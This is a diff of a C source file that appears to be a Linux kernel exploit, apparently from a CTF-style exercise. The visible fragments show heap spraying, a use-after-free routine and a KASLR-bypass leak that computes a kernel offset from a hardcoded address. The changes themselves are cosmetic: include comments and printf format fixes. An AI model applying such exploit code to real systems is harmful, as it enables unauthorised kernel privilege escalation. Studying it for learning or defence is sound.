@@ -1,13 +1,13 @@
-#include <ctype.h>
-#include <fcntl.h>
-#include <sched.h>
-#include <stdbool.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/ioctl.h>
-#include <unistd.h>
+#include <ctype.h>      // for isdigit
+#include <fcntl.h>      // for open, O_RDWR, O_NOCTTY, O_RDONLY
+#include <inttypes.h>   // for uintptr_t, uint8_t, PRIx64, uint32_t
+#include <sched.h>      // for sched_yield
+#include <stdbool.h>    // for true
+#include <stdio.h>      // for printf, NULL, puts
+#include <stdlib.h>     // for EXIT_SUCCESS
+#include <string.h>     // for memset, strncmp
+#include <sys/ioctl.h>  // for ioctl
+#include <unistd.h>     // for read, close, write, execve
 
 #define SPRAY_COUNT 50
 
@@ -51,7 +51,7 @@ static void save_state(void)
 
 static void uaf(void)
 {
-	uint8_t data[0x164];
+	char data[0x164];
 
 	while (true) {
 		fd0 = -1;
@@ -101,10 +101,10 @@ static void leak_offset_and_g_buf(void)
 	read(fd1, data, 0x40);
 	ptr = *(uintptr_t *)&data[0x18];
 	offset = ptr - 0xffffffff81c39c60;
-	printf("[+] offset %p\n", offset);
+	printf("[+] offset %#" PRIx64 "\n", offset);
 
 	g_buf = *(uintptr_t *)&data[0x38] - 0x38;
-	printf("[+] g_buf %p\n", g_buf);
+	printf("[+] g_buf %#" PRIx64 "\n", g_buf);
 }
 
 int main(void)
